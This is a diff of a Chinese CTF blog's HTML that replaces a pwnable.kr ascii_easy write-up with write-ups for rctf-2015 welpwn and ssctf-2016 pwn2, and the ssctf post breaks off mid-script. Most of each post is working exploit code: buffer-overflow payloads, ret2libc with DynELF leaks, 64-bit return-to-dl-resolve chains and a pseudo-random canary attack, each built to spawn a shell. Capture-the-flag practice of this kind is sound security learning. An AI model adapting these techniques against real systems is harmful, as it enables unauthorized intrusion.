+<li><code>%6$lx</code>: 栈上的第一个QWORD</li>
+</ul>
+<h1 id="0x2_技巧">0x2 技巧</h1><ol>
+<li>可以泄露栈的地址</li>
+<li>泄露__libc_start_main_ret （在堆利用中遇到过一次，alictf-qual-2016-fb, bctf-qual-2016-bcloud）</li>
+<li>泄露canary</li>
+<li>利用相邻ebp之间的引用关系，实现理论上的任意地址读写 (参考pwnable.kr-fsb 和 rctf-qual-2015-nobug，其实感觉不太好用，需要连着两次的fsb才行)</li>
+</ol>
 
           
         
@@ -824,8 +574,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/08/11/pwnable-rookiss-ascii-easy/" itemprop="url">
-                  pwnable.kr-rookiss-ascii-easy
+                <a class="post-title-link" href="/2016/09/05/rctf-qual-2015-welpwn/" itemprop="url">
+                  rctf-qual-2015-welpwn
                 </a>
               
             
@@ -838,8 +588,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-11T00:00:00+08:00" content="2016-08-11">
-              2016-08-11
+            <time itemprop="dateCreated" datetime="2016-09-05T00:00:00+08:00" content="2016-09-05">
+              2016-09-05
             </time>
           </span>
 
@@ -852,8 +602,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
                   </a>
                 </span>
 
@@ -868,8 +618,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/11/pwnable-rookiss-ascii-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/11/pwnable-rookiss-ascii-easy/" itemprop="commentsCount"></span>
+                <a href="/2016/09/05/rctf-qual-2015-welpwn/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/05/rctf-qual-2015-welpwn/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -894,20 +644,295 @@
       
         
           
-            <h1 id="Trick">Trick</h1><p><code>ulimit -s unlimited</code> 禁用<strong>aslr</strong></p>
-<h1 id="Conclusion">Conclusion</h1><p><del>没有做出来，不过顺便翻了《Shellcode’s Handerbook》- Chapter 9 学习了下</del></p>
-<p>第二次来做，还是遇到了很多障碍，首先<code>system</code>的地址在计算出来后发现不是都是符合要求的字节，然后试了下<code>execve</code>发现可以</p>
-<p>接下来就是找字符串，刚开始试了<code>&#39;/bin/sh\x00&#39;</code>，都不符合要求。然后又试了<code>&#39;sh\x00&#39;</code>，也不符合要求，于是我就没辙了。再次求助google(即使是第二次来做也还是没做出来，心好累:(</p>
-<p>首先，<code>execlp</code>函数的原型为<code>int execlp(const char *file, const char *arg, ...);</code></p>
-<p>通过<code>man execv</code>，可以看到其中有一段对<code>execlp</code>函数的解释</p>
-<blockquote>
-<p>The execlp(), execvp(), and execvpe() functions duplicate the  actions  of  the  shell  in<br>searching  for  an  executable file if the specified filename does not contain a slash (/)<br>character.  The file is sought in the colon-separated list of directory  pathnames  speci-<br>fied  in  the  PATH  environment  variable.  If this variable isn’t defined, the path list<br>defaults to the current directory followed by the list of directories  returned  by  conf-<br>str(_CS_PATH).  (This confstr(3) call typically returns the value “/bin:/usr/bin”.)</p>
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
 </blockquote>
-<p>假使输入的<code>filename</code>不含<code>/</code>符号，就会采取和shell寻找可执行文件一样的方式去寻找这个文件，即遍历<strong>$PATH</strong>环境变量中的路径，在每个路径下尝试寻找<code>filename</code>文件</p>
-<p>因此只要将一个我们可写的路径加到PATH环境变量里，然后在这个路径下任意创建一个可以启动shell的文件，调整一个合适的文件名，使得能在内存中搜到这个文件名的字符串即可，这里选取了”h”文件名，在gdb中用<code>gdb$ find 0x5558b000,+0x1a6000,&quot;h&quot;</code>搜索该字符串，筛选符合要求的即可</p>
-<h1 id="Exploit">Exploit</h1><h2 id="log">log</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh ascii_easy@pwnable.kr -p2222</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line">ascii_easy@ubuntu:/tmp$ mkdir icemakrrr</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ cat &gt; h</span><br><span class="line"><span class="shebang">#!/bin/sh</span></span><br><span class="line">/bin/sh</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ <span class="built_in">export</span> PATH=/tmp/icemakrrr:<span class="variable">$PATH</span></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ <span class="built_in">ulimit</span> <span class="operator">-s</span> unlimited</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ cat &gt; exp.py</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">'/home/ascii_easy/ascii_easy'</span>)</span><br><span class="line"></span><br><span class="line">adr_execlp  = <span class="number">0</span>x55643970</span><br><span class="line">adr_filenm  = <span class="number">0</span>x55665c6c</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'A'</span> * <span class="number">0</span>xac</span><br><span class="line">payload += p32(adr_execlp)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(adr_filenm)</span><br><span class="line">payload += p32(<span class="number">0</span>x0)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ python exp.py</span><br><span class="line">[+] Starting program <span class="string">'/home/ascii_easy/ascii_easy'</span>: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Input text : triggering bug...</span><br><span class="line">$ <span class="built_in">cd</span></span><br><span class="line">$ cat flag</span><br><span class="line">damn you ascii armor... what a pain <span class="keyword">in</span> the ass!! :(</span><br><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h2 id="exp-py">exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'/home/ascii_easy/ascii_easy'</span>)</span><br><span class="line"></span><br><span class="line">adr_execlp  = <span class="number">0x55643970</span> <span class="comment"># gdb$ p execlp</span></span><br><span class="line">adr_filenm  = <span class="number">0x55665c6c</span> <span class="comment"># find 0x5558b000,+0x1a6000,"h"</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'A'</span> * <span class="number">0xac</span></span><br><span class="line">payload += p32(adr_execlp)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(adr_filenm)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="Reference">Reference</h1><p><a href="http://werew.tk/article/12/ascii_easy-pwnablekr" target="_blank" rel="external">http://werew.tk/article/12/ascii_easy-pwnablekr</a></p>
+<h1 id="Conclusion">Conclusion</h1><h2 id="Bug">Bug</h2><p>漏洞在如下代码所示处</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [sp+10h] [bp-10h]@2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">        s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">    s2[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"ROIS"</span>, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"RCTF&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>普通的x86_64下的栈溢出，不过读上去的payload会被<code>\x00</code>截断，要通过<code>add $rsp; ret</code>来跳到完整的payload上</p>
+<p>之后就是常规的<strong><em>memory dump + return to libc</em></strong>，其实可以直接利用<strong><em>libc-database</em></strong>来泄露libc，不过<strong><em>libc-database</em></strong>上只有Ubuntu的libc貌似，所以还是练习了下使用<strong><em>DynELF</em></strong></p>
+<p>这题还可以用<strong><em>return to dl-resolve</em></strong>来解决，之前只写过32位的，这次就再写了下，练习了64位下的，64位下不同的地方就是<code>reloc_arg</code>变成0x18为一个单位，另外<code>Elf64_Sym</code>结构内的成员的顺序也有变化，还有就是需要泄露<code>link_map</code>，并将<code>link_map+0x1c8</code>覆盖为0x0 </p>
+<p>下面是我写好的代码，写的时候参考了<a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="external">[1]</a>，以后只需要修改<code>adr_rel_plt, adr_dyn_sym, adr_dyn_str, adr_stage</code>以及用到的got表和plt表的相关函数地址</p>
+<p>另外又听说了<a href="https://github.com/inaz2/roputils" target="_blank" rel="external">roputils</a>这个工具能快速辅助编写<em>return to dl-resolve</em>，于是尝试了一发。稍微改一下demo的脚本就好了</p>
+<h1 id="Exploit">Exploit</h1><h2 id="memory_leak_+_ret2libc">memory leak + ret2libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.elf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./welpwn_932a4428ea8d4581431502ab7e66ea4b'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">0x10000</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi     = <span class="number">0x004008a3</span></span><br><span class="line">pop_rsi_p   = <span class="number">0x004008a1</span></span><br><span class="line">p4_ret      = <span class="number">0x0040089c</span></span><br><span class="line">plt_puts    = <span class="number">0x004005a0</span></span><br><span class="line">got_write   = <span class="number">0x00601020</span></span><br><span class="line">got_puts    = <span class="number">0x00601018</span></span><br><span class="line">adr_bss     = <span class="number">0x00601000</span></span><br><span class="line">got_read    = <span class="number">0x00601038</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></span><br><span class="line">    payload  = l64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += l64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += l64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += l64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += l64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += l64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += l64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += l64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>     <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">    payload += l64(p4_ret)</span><br><span class="line">    payload += com_gadget(<span class="number">0x40089a</span>, <span class="number">0x400880</span>, jmp2 = got_write,</span><br><span class="line">            arg1 = <span class="number">0x1</span>,</span><br><span class="line">            arg2 = address,</span><br><span class="line">            arg3 = <span class="number">0x20</span>)</span><br><span class="line">    payload += l64(<span class="number">0x400630</span>) <span class="comment"># program entry</span></span><br><span class="line">    io.wl(payload)</span><br><span class="line">    leak_data = io.rtl(<span class="string">'A'</span> * <span class="number">24</span> + l64(p4_ret)[:<span class="number">3</span>]).replace(<span class="string">'Welcome to RCTF\n'</span>, <span class="string">''</span>).replace(<span class="string">'A'</span> * <span class="number">24</span> + l64(p4_ret)[:<span class="number">3</span>], <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-] &#123;&#125;\t==&gt;\t&#123;&#125;'</span>.format(hex(ctypes.c_uint64(address).value), leak_data.encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(adr_system)</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">    payload += l64(p4_ret)</span><br><span class="line">    payload += com_gadget(<span class="number">0x40089a</span>, <span class="number">0x400880</span>, jmp2 = got_read,</span><br><span class="line">            arg1 = <span class="number">0x0</span>,</span><br><span class="line">            arg2 = adr_bss + <span class="number">0x80</span>,</span><br><span class="line">            arg3 = <span class="number">0x10</span>)</span><br><span class="line">    payload += com_gadget(<span class="number">0x40089a</span>, <span class="number">0x400880</span>, jmp2 = adr_bss + <span class="number">0x88</span>,</span><br><span class="line">            arg1 = adr_bss + <span class="number">0x80</span>)</span><br><span class="line">    payload += l64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    io.wl(payload)</span><br><span class="line">    io.wl(<span class="string">'/bin/sh\x00'</span> + l64(adr_system))</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = ELF(<span class="string">'welpwn_932a4428ea8d4581431502ab7e66ea4b'</span>))</span><br><span class="line"></span><br><span class="line">adr_system = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system addr\t:\t'</span> + hex(adr_system)</span><br><span class="line">exp(adr_system)</span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
+<h2 id="return_to_dl-resolve">return to dl-resolve</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./welpwn_932a4428ea8d4581431502ab7e66ea4b'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00000000004007cc</span>])</span><br><span class="line"></span><br><span class="line">plt_resolve = <span class="number">0x0000000000400590</span></span><br><span class="line">got_read    = <span class="number">0x0000000000601038</span></span><br><span class="line">got_write   = <span class="number">0x0000000000601020</span></span><br><span class="line">got_linkmap = <span class="number">0x0000000000601008</span></span><br><span class="line"></span><br><span class="line">leave_ret   = <span class="number">0x00000000004007cb</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400675</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004008a3</span></span><br><span class="line">p4_ret      = <span class="number">0x000000000040089c</span></span><br><span class="line"></span><br><span class="line">adr_stage   = <span class="number">0x0000000000601000</span> + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">adr_rel_plt         = <span class="number">0x0000000000400498</span></span><br><span class="line">adr_dyn_sym         = <span class="number">0x00000000004002c0</span></span><br><span class="line">adr_dyn_str         = <span class="number">0x00000000004003c8</span></span><br><span class="line">adr_fake_rel_plt    = adr_stage + <span class="number">0x100</span></span><br><span class="line">adr_fake_dyn_sym    = adr_stage + <span class="number">0x208</span></span><br><span class="line">adr_fake_dyn_str    = adr_stage + <span class="number">0x300</span></span><br><span class="line">adr_shell           = adr_stage + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">com_part1           = <span class="number">0x40089a</span></span><br><span class="line">com_part2           = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line">adr_entry           = <span class="number">0x400630</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></span><br><span class="line">    payload  = l64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += l64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += l64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += l64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += l64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += l64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += l64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += l64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>     <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak link_map</span></span><br><span class="line">payload0  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload0 += l64(p4_ret)</span><br><span class="line">payload0 += com_gadget(com_part1, com_part2, got_write,</span><br><span class="line">        arg1 = <span class="number">0x1</span>,</span><br><span class="line">        arg2 = got_linkmap,</span><br><span class="line">        arg3 = <span class="number">0x8</span>)</span><br><span class="line">payload0 += l64(adr_entry)</span><br><span class="line"></span><br><span class="line">io.rl()</span><br><span class="line">io.wl(payload0)</span><br><span class="line">adr_linkmap = l64(io.r(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak link_map\t:\t'</span> + hex(adr_linkmap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite link_map+0x1c8 0x0, read fake structure</span></span><br><span class="line">payload0  = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload0 += l64(p4_ret)</span><br><span class="line">payload0 += com_gadget(com_part1, com_part2, got_read,</span><br><span class="line">        arg1 = <span class="number">0x0</span>,</span><br><span class="line">        arg2 = adr_linkmap + <span class="number">0x1c8</span>,</span><br><span class="line">        arg3 = <span class="number">0x8</span>)</span><br><span class="line">payload0 += com_gadget(com_part1, com_part2, got_read,</span><br><span class="line">        arg1 = <span class="number">0x0</span>,</span><br><span class="line">        arg2 = adr_stage,</span><br><span class="line">        arg3 = <span class="number">0x500</span>)</span><br><span class="line">payload0 += l64(pop_rbp_ret)</span><br><span class="line">payload0 += l64(adr_stage)</span><br><span class="line">payload0 += l64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.rl()</span><br><span class="line">io.wl(payload0)</span><br><span class="line">io.w(l64(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake structure</span></span><br><span class="line">align_rel_plt   = <span class="number">0x8</span>*<span class="number">3</span> - (adr_fake_rel_plt - adr_rel_plt) % (<span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">payload1  = <span class="string">'A'</span> * <span class="number">0x8</span></span><br><span class="line">payload1 += l64(pop_rdi_ret) <span class="comment"># set $rdi "/bin/sh"</span></span><br><span class="line">payload1 += l64(adr_shell)</span><br><span class="line">payload1 += l64(plt_resolve)</span><br><span class="line">payload1 += l64((adr_fake_rel_plt - adr_rel_plt + align_rel_plt) / (<span class="number">0x8</span> * <span class="number">3</span>))</span><br><span class="line">payload1 += l64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x100</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">align_dyn_sym   = <span class="number">0x8</span>*<span class="number">3</span> - (adr_fake_dyn_sym - adr_dyn_sym) % (<span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">payload1 += <span class="string">'A'</span> * align_rel_plt</span><br><span class="line">payload1 += l64(got_read)</span><br><span class="line">payload1 += l64((adr_fake_dyn_sym - adr_dyn_sym + align_dyn_sym)/(<span class="number">0x8</span>*<span class="number">3</span>)*<span class="number">0x100000000</span> + <span class="number">0x7</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x208</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">payload1 += <span class="string">'A'</span> * align_dyn_sym</span><br><span class="line">payload1 += l32(adr_fake_dyn_str - adr_dyn_str)</span><br><span class="line">payload1 += l32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += l64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l64(<span class="number">0x0</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x300</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">payload1 += <span class="string">'system\x00'</span></span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x400</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">payload1 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.wl(payload1)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h2 id="return_to_dl-resolve_by_using_rop-utils">return to dl-resolve by using rop-utils</h2><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="label">from</span> roputils <span class="preprocessor">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="label">fpath</span> = <span class="string">'./welpwn_932a4428ea8d4581431502ab7e66ea4b'</span></span><br><span class="line"></span><br><span class="line"><span class="label">rop</span> = ROP(fpath)</span><br><span class="line"><span class="label">offset</span> = <span class="number">24</span></span><br><span class="line"><span class="label">p4_ret</span> = <span class="number">0x0040089c</span></span><br><span class="line"><span class="keyword">addr_stage </span>= rop<span class="preprocessor">.section</span>(<span class="string">'.bss'</span>) + <span class="number">0x400</span></span><br><span class="line"><span class="label">ptr_ret</span> = rop.search(rop<span class="preprocessor">.section</span>(<span class="string">'.fini'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span> = <span class="string">'A'</span> * offset</span><br><span class="line"><span class="keyword">buf </span>+= p64(p4_ret)</span><br><span class="line"><span class="keyword">buf </span>+= rop.call_chain_ptr(</span><br><span class="line">    [<span class="string">'write'</span>, <span class="number">1</span>, rop.got()+<span class="number">8</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="string">'read'</span>, <span class="number">0</span>, <span class="keyword">addr_stage, </span><span class="number">400</span>]</span><br><span class="line">, pivot<span class="label">=addr_stage</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="preprocessor">Proc</span>(rop.fpath)</span><br><span class="line"><span class="label">p.write</span>(<span class="keyword">buf)</span><br><span class="line"></span><span class="label">print</span> <span class="string">"[+] read: %r"</span> % p.read(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">addr_link_map </span>= p.read_p64()</span><br><span class="line"><span class="keyword">addr_dt_debug </span>= <span class="keyword">addr_link_map </span>+ <span class="number">0x1c8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span>= rop.call_chain_ptr(</span><br><span class="line">    [<span class="string">'read'</span>, <span class="number">0</span>, <span class="keyword">addr_dt_debug, </span><span class="number">8</span>],</span><br><span class="line">    [ptr_ret, <span class="keyword">addr_stage+380]</span><br><span class="line"></span>)</span><br><span class="line"><span class="keyword">buf </span>+= rop.dl_resolve_call(<span class="keyword">addr_stage+300)</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.fill(<span class="number">300</span>, <span class="keyword">buf)</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.dl_resolve_data(<span class="keyword">addr_stage+300, </span><span class="string">'system'</span>)</span><br><span class="line"><span class="keyword">buf </span>+= rop.fill(<span class="number">380</span>, <span class="keyword">buf)</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.<span class="keyword">string('/bin/sh')</span><br><span class="line"></span><span class="keyword">buf </span>+= rop.fill(<span class="number">400</span>, <span class="keyword">buf)</span><br><span class="line"></span></span><br><span class="line"><span class="label">p.write</span>(<span class="keyword">buf)</span><br><span class="line"></span><span class="label">p.write_p64</span>(<span class="number">0</span>)</span><br><span class="line"><span class="label">p.interact</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><ol>
+<li><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="external">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/09/03/ssctf-qual-2016-pwn2/" itemprop="url">
+                  ssctf-qual-2016-pwn2
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-03T00:00:00+08:00" content="2016-09-03">
+              2016-09-03
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/03/ssctf-qual-2016-pwn2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/03/ssctf-qual-2016-pwn2/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
+</blockquote>
+<h1 id="Conclusion">Conclusion</h1><h2 id="Bugs">Bugs</h2><ul>
+<li>integer overflow</li>
+<li>off by one bug</li>
+<li>psedu random</li>
+</ul>
+<p>题目和pwn400的差不多，就是多了一个以服务器时间作为种子生成的伪随机数在结构里当做<em>canary</em></p>
+<p>本地测试时，获取本地机器的时间，然后用c语言写一个生成伪随机的程序即可泄露出<em>canary</em>，在远程测试时，获取远程的服务器时间即可，不过由于网络延迟，所以加了一个-3~3的随机数作为误差，获取远程服务器时间的代码取自@<a href="https://github.com/RickGray" target="_blank" rel="external">RickGray</a>的一篇<a href="pwnable.kr">pwnable.kr-md5-calculator</a>的writeup<a href="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html" target="_blank" rel="external">[1]</a>，如下所示</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">date        = urllib2.urlopen(<span class="string">'remote-server'</span>).headers[<span class="string">'Date'</span>]</span><br><span class="line">leak_time   = int(time.mktime(time.strptime(date, <span class="string">'%a, %d %b %Y  %H:%M:%S %Z'</span>)))</span><br><span class="line">leak_time   += random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes, os, time, urllib2</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack pseudo-random</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        leak        = int(os.popen(<span class="string">'./leak '</span> + str(int(time.time()))).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        date        = urllib2.urlopen(<span class="string">'remote-server'</span>).headers[<span class="string">'Date'</span>]</span><br><span class="line">        leak_time   = int(time.mktime(time.strptime(date, <span class="string">'%a, %d %b %Y  %H:%M:%S %Z'</span>)))</span><br><span class="line">        leak_time   += random.randint(<span class="number">0</span>, <span 